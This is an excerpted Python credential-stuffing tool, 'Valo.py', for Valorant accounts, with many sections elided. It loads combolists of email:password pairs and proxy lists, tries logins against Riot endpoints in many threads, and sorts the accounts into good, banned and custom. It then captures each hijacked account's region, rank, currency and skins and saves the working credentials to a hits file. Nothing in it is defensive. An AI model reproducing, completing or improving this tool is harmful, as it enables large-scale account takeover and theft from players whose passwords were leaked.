...
import time
try:
    import requests, threading, time, random, json, tkinter, readchar
...
class Valorant:
    ...
    hits, fail, free, banned, cpm, cpm1, error, retries, checked = (
        0,
        0,
        0,
        0,
 ...
 ▓██  █▒░   ▒██  ▀█▄     ▒██░       ▒██░  ██▒           ▓██░ ██▓▒ ▒██ ██░
  ▒██ █░░   ░██▄▄▄▄██    ▒██░       ▒██   ██░           ▒██▄█▓▒ ▒ ░ ▐██▓░
   ...
   """
    ...
    def LoadCombolist():
        ...
        if fileNameCombo is None:
            ...
            try:
                ...
                print(
                    f"{ErrorIcon} Your combo file is probably harmed, please try again.."
                )
                time.sleep(2)
                Valorant.LoadCombolist()
    ...
    def LoadProxies():
        fileNameProxy = filedialog.askopenfile(
            parent=root,
            mode="rb",
        ...
        if fileNameProxy is None:
            ...
            try:
                with open(
                    fileNameProxy.name, "r+", encoding="utf-8", errors="ignore"
                ) as e:
                    ext = e.readlines()
                    for line in ext:
                        try:
                ...
                print(
                    f"{ErrorIcon} Your proxy file is probably harmed, please try again.."
                )
    ...
    def ScreenLOG():
        ...
        windll.kernel32.SetConsoleTitleW(
            f" Valo.py | Checked: {checked}\{len(emails)} -  Good: {hits} - Bad: {fail} - Customs: {free} - Banned Accounts: {banned} - Cpm: {cmp1*60} - Retries: {retries} - Errors: {error} "
        )
        time.sleep(1)
    ...
    def ScreenCUI():
        ...
        print()
        print(
            " Valo.py Running... [{}]".format(
                Fore.LIGHTMAGENTA_EX + str(ComboName) + Fore.LIGHTWHITE_EX
            )
        )
        ...
        print(
            " [{}] Banned Accounts".format(
                Fore.LIGHTBLUE_EX + str(banned) + Fore.LIGHTWHITE_EX
            )
        )
        print(
            " [{}] Customs".format(Fore.LIGHTYELLOW_EX + str(free) + Fore.LIGHTWHITE_EX)
        )
        print(
            " [{}] Retries".format(
                Fore.LIGHTCYAN_EX + str(retries) + Fore.LIGHTWHITE_EX
            )
        )
        print(
            " [{}] Errors".format(Fore.LIGHTYELLOW_EX + str(error) + Fore.LIGHTWHITE_EX)
        )
        windll.kernel32.SetConsoleTitleW(
            f" Valo.py | Checked: {checked}\{len(emails)} -  Good: {hits} - Bad: {fail} - Customs: {free} - Banned Accounts: {banned} - Cpm: {cmp1*60} - Retries: {retries} - Errors: {error} "
        )
    ...
    def FinishScreen():
        ...
        print()
        print(
            f"{Icon} Info: [Total Good: {hits} | Total Bad: {fail} | Total Custom: {free} | Total Banned Account: {banned}]"
        )
    ...
    def Checker(email, password, proxylist):
        try:
            ...
            if "access_token" in GetLogin.text:
                ...
                Valorant.Capture(
                    AccessToken=AccessToken, User=email, Pass=password, sess=sess
                )
                ...
                retries += 1
                threading.Thread(
                    target=Valorant.Checker, args=(email, password, proxylists)
                ).start()
            else:
                retries += 1
                threading.Thread(
    ...
    def Capture(AccessToken, User, Pass, sess):
        ...
        try:
            ...
            GetEntitlementsToken = sess.post(
                UrlList["EntitlementsUrl"], headers=DefaultHeaders, timeout=timeout
            )
            EntitlementsToken = GetEntitlementsToken.json()["entitlements_token"]
            GetUserInfo = sess.post(
                UrlList["UserInfoUrl"], headers=DefaultHeaders, timeout=timeout
            )
            if '"scope":"ares"' in GetUserInfo.text:
                if CheckerUI == "LOG":
                    print(
                        f"{Fore.LIGHTYELLOW_EX} [Banned] {User}:{Pass} {Fore.LIGHTWHITE_EX}"
                    )
                checked += 1
                cpm += 1
                banned += 1
            ...
            if "region" in GetAccountRegion.text:
                ...
                if CheckerUI == "LOG":
                    print(
                        f"{Fore.LIGHTYELLOW_EX} [Custom] {User}:{Pass} {Fore.LIGHTWHITE_EX}"
                    )
                checked += 1
                cpm += 1
                free += 1
            ...
            try:
                CheckRanked = sess.get(
                    f"https://pd.{Region}.a.pvp.net/mmr/v1/players/{Sub}/competitiveupdates",
                ...
                if '","Matches":[]}' in CheckRanked.text:
                    ...
                    RankID = CheckRanked.text.split('"TierAfterUpdate":')[1].split(
                        ',"'
                    )[0]
            ...
            try:
                ...
                Radianite = GetPoints.json()["Balances"][
            ...
            try:
                GetSkins = sess.get(
                    f"https://pd.{Region}.a.pvp.net/personalization/v2/players/{Sub}/playerloadout",
                    headers=PvpNetHeaders,
                    timeout=timeout,
                )
                ...
                for xs in SkinRange:
                    ...
                    GetSkinName = sess.get(
                        f"https://valorant-api.com/v1/weapons/skins/{Skins2}"
                    )
            ...
            if CheckerUI == "LOG":
                print(
                    f"{Fore.LIGHTGREEN_EX} [Good] {User}:{Pass} | Region: {Region} | Level: {AccountLevel} | Email Verified: {EmailVerified} | Rank: {Rank} | VP: {ValorantPoints} | RP: {Radianite} | Total Skins: {len(Skin)} {Fore.LIGHTWHITE_EX}"
                )
            hits += 1
            checked += 1
            cpm += 1
            ...
            SaveHitss.write(
                f"{User}:{Pass} | Region: {Region} | Level: {AccountLevel} | Email Verified: {EmailVerified} | Rank: {Rank} | VP: {ValorantPoints} | RP: {Radianite} | Total Skins: {len(Skin)}\n"
            )
            SaveHitss.close()
        except Exception as exp:
            if str(exp) == "list index out of range":
                ...
                retries += 1
                threading.Thread(
                    target=Valorant.Checker, args=(User, Pass, proxylists)
                ).start()

    def CheckerMenu():
        global thread, proxytype
        clear()
        windll.kernel32.SetConsoleTitleW("Valo.py")
        print(logo)
        print()
        print()
        try:
            ...
            if threading.active_count() < int(thread):
                if len(emails) > num:
                    try:
                        num += 1
                        threading.Thread(
                            target=Valorant.Checker,
                            args=(emails[num], passwords[num], proxylists),
                        ).start()
                    except:
